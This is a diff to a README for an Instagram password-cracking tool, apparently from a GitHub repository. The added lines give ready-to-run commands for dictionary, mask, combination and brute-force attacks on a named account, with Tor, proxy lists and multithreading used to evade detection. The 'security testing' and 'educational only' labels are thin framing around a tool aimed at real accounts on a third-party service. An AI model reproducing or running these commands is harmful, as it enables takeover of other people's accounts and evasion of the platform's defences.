@@ -67,8 +67,8 @@ Hack Instagram Password is an advanced security testing tool designed to demonst
 
 ### Step 1: Clone Repository
 ```bash
-git clone https://github.com/ieuhhr/InstaHack-with-AI/hack-instagram-password.git
-cd hack-instagram-password
+git clone https://github.com/your-username/hack-Instagram-password.git
+cd hack-Instagram-password
 
 Step 2: Install Dependencies
 bash
@@ -88,11 +88,66 @@ asyncio>=3.9.0
 Step 3: Verify Installation
 bash
 
-python hack_instagram.py --help
+python hack_Instagram.py --help
 
 ⚡ Quick Start
 Basic Password Testing
 bash
+
+python hack_Instagram.py --username your_test_account --password-list passwords.txt
+
+Anonymous Testing with Tor
+bash
+
+python hack_Instagram.py --username your_test_account --password-list passwords.txt --use-tor
+
+Advanced Multi-threaded Attack
+bash
+
+python hack_Instagram.py --username your_test_account --password-list passwords.txt --threads 4 --use-tor --min-delay 2 --max-delay 5
+
+Proxy-Based Attack
+bash
+
+python hack_Instagram.py --username your_test_account --password-list passwords.txt --proxy-list proxies.txt --threads 3
+
+🔥 Attack Methods
+1. Dictionary Attacks
+
+Test passwords from comprehensive wordlists:
+bash
+
+# Using common passwords list
+python hack_Instagram.py --username target --password-list common_passwords.txt
+
+# Using customized wordlist
+python hack_Instagram.py --username target --password-list custom_list.txt
+
+2. Mask Attacks
+
+Pattern-based password generation:
+python
+
+# Example mask patterns:
+?l?l?l?d?d?d  # 3 letters + 3 digits (abc123)
+?u?l?l?l?d?d  # 1 uppercase + 3 lowercase + 2 digits (Abcd12)
+?l?l?l?l?s?d  # 4 letters + 1 special char + 1 digit (abcd!1)
+
+3. Combination Attacks
+
+Intelligent password variations:
+bash
+
+# Base words with common modifications
+python hack_Instagram.py --username target --strategy combination --base-words "password,admin,user"
+
+4. Brute Force Attacks
+
+Complete character set testing (use with caution):
+bash
+
+# Not recommended for production - educational only
+python hack_Instagram.py --username target --strategy brute --min-length 4 --max-length 8
 
 python hack_instagram.py --username your_test_account --password-list passwords.txt
 
